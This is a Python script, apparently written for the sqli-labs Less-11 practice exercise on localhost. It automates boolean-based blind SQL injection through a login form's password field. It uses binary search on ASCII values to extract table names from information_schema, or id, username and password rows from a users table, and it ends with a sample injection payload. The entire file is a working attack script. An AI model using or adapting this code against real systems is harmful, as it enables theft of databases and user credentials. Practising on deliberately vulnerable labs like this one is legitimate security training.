import sys
import requests

def getPayload(result_index, char_index, ascii):
    # 系统表中数据
    info_database_name = "information_schema"
    info_table_name = "tables" # schemata / tables / columns
    info_column_name = "table_name" # schema_name / table_name / column_name
    
    # 注入表中数据
    database_name = "security"
    table_name = "users"
    column_name = ["id","username","password"]
    
    # 连接select
    where_str = " " #表 "空格  where table_schema='security'"
    #where_str = " where table_schema='"+database_name+"'"+" and table_name='"+table_name+"'"
    select_str = "select "+info_column_name+" from "+info_database_name+"."+info_table_name+where_str+" limit "+str(result_index)+",1"
    #select_str = "select concat_ws('-',"+column_name[0]+","+column_name[1]+","+column_name[2]+") from "+table_name+" limit "+str(result_index)+",1"
    
    # 连接payload
    sqli_str = "(ascii(mid(("+select_str+"),"+str(char_index)+",1))>"+str(ascii)+")"
    payload = {"uname":"1", "passwd":"1' or "+sqli_str+"-- "}
    return payload

def execute(result_index, char_index, ascii):
    # 连接url
    url = "http://127.0.0.1/sqli-labs/Less-11/"
    payload = getPayload(result_index, char_index, ascii)
    #print(payload)
    # 检查回显
    echo = "Your Login name"
    content = requests.post(url, data=payload).text
    if echo in content:
        return True
    else:
        return False

def dichotomy(result_index, char_index, left, right):
    while left < right:
        # 二分法
        ascii = int((left+right)/2)
        if execute(str(result_index), str(char_index+1), str(ascii)):
            left = ascii
        else:
            right = ascii
        # 结束二分
        if left == right-1:
            if execute(str(result_index), str(char_index+1), str(ascii)):
                ascii += 1
                break
            else:
                break
    return chr(ascii)

if __name__ == "__main__":
    for num in range(32): # 查询结果的数量
        count = 0
        for len in range(32): # 单条查询结果的长度
            count += 1
            char = dichotomy(num, len, 30, 126) 
            if ord(char) == 31: # 单条查询结果已被遍历
                break
            sys.stdout.write(char)
            sys.stdout.flush()
        if count == 1: # 查询结果已被遍历
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()
'''
uname=1&passwd=1' or ((ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1)))>65)--+
'''
